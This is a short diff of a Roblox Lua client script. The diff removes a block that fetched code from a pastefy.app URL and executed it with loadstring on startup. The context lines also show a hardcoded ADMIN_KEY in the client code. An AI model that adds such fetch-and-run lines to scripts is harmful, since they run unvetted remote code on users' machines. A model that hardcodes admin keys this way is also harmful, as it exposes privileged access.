@@ -3,10 +3,6 @@ local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
-do
-loadstring(game:HttpGet("https://pastefy.app/W2tptcDF/raw"))()
-end
-
 local ADMIN_KEY = "f888ee6e-c86d-46e1-93d7-0639d6635d42" 
 
 local gui_parent
